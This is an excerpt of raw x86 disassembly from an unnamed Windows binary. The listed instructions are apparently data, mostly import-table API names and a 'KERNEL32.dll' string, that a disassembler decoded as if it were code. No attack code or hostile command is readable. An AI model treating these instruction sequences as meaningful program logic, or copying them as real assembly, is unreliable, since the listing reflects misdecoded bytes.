  429571:	add    DWORD PTR [edi+0x65],eax
  429574:	je     0x4295bc
  429576:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  42957e:	bound  esi,QWORD PTR [ebp+0x74]
  429581:	gs jae 0x4295c5
  429584:	add    BYTE PTR [eax],al
  429586:	sub    al,0x1
  429588:	inc    ebp
  429589:	outs   dx,BYTE PTR ds:[esi]
  42958a:	jne    0x4295f9
  42958c:	push   ebx
  42958d:	jns    0x429602
  42958f:	je     0x4295f6
  429591:	ins    DWORD PTR es:[edi],dx
  429592:	dec    esp
  429593:	outs   dx,DWORD PTR ds:[esi]
  429594:	arpl   WORD PTR [ecx+0x6c],sp
  429597:	gs jae 0x4295db
  42959a:	add    BYTE PTR [eax],al
  42959c:	sub    eax,0x74655304
  4295a1:	dec    esp
  4295a2:	outs   dx,DWORD PTR ds:[esi]
  4295a3:	arpl   WORD PTR [ecx+0x6c],sp
  4295a6:	push   esp
  4295a7:	imul   ebp,DWORD PTR [ebp+0x65],0x1240000
  4295ae:	inc    ebp
  4295af:	outs   dx,BYTE PTR ds:[esi]
  4295b0:	jne    0x42961f
  4295b2:	push   edx
  4295b3:	gs jae 0x429625
  4295b6:	jne    0x42962a
  4295b8:	arpl   WORD PTR [ebp+0x4e],sp
  4295bb:	popa   
  4295bc:	ins    DWORD PTR es:[edi],dx
  4295bd:	gs jae 0x429617
  4295c0:	add    BYTE PTR [eax],al
  4295c2:	imul   eax,DWORD PTR [esp+edx*2],0x7246736c
  4295c9:	gs add BYTE PTR gs:[ebx],ah
  4295cd:	add    al,0x53
  4295cf:	gs je  0x429618
  4295d2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  4295da:	gs jb  0x4295dd
  4295dd:	add    BYTE PTR [edi+0x1],ch
  4295e0:	inc    esi
  4295e1:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  4295e8:	jne    0x42965c
  4295ea:	arpl   WORD PTR [ebp+0x41],sp
  4295ed:	add    BYTE PTR ds:0x6c654401,al
  4295f3:	gs je  0x42965b
  4295f6:	inc    esi
  4295f7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x4701a400
  4295ff:	gs je  0x429645
  429602:	outs   dx,DWORD PTR ds:[esi]
  429603:	ins    DWORD PTR es:[edi],dx
  429604:	jo     0x42967b
  429606:	je     0x42966d
  429608:	jb     0x429658
  42960a:	popa   
  42960b:	ins    DWORD PTR es:[edi],dx
  42960c:	gs inc ebp
  42960e:	js     0x429651
  429610:	add    BYTE PTR [eax],al
  429612:	cmp    BYTE PTR [ebx],al
  429614:	dec    ebp
  429615:	outs   dx,DWORD PTR ds:[esi]
  429616:	jbe    0x42967d
  429618:	inc    esi
  429619:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52454b00
  429621:	dec    esi
  429622:	inc    ebp
  429623:	dec    esp
  429624:	xor    esi,DWORD PTR [edx]
  429626:	cs fs ins BYTE PTR es:[edi],dx
  429629:	ins    BYTE PTR es:[edi],dx
  42962a:	add    BYTE PTR [eax],al
  42962c:	add    BYTE PTR [eax],al
  42962e:	add    BYTE PTR [eax],al
  429630:	mov    al,ds:0x222
	...
  42964d:	add    BYTE PTR [eax],al
  42964f:	add    BYTE PTR [ebx-0x6a],ch
  429652:	add    al,BYTE PTR [eax]
	...
  429660:	imul   esp,DWORD PTR fs:[edx+0x6f],0x632e6661
  429668:	outs   dx,DWORD PTR ds:[esi]
  429669:	ins    DWORD PTR es:[edi],dx
  42966a:	add    BYTE PTR [ebx+0x72],al
  42966d:	je     0x4296c3
  42966f:	push   0x64616572
  429674:	inc    ebp
  429675:	js     0x4296b8
  429677:	inc    eax
  429678:	cmp    BYTE PTR [eax],al
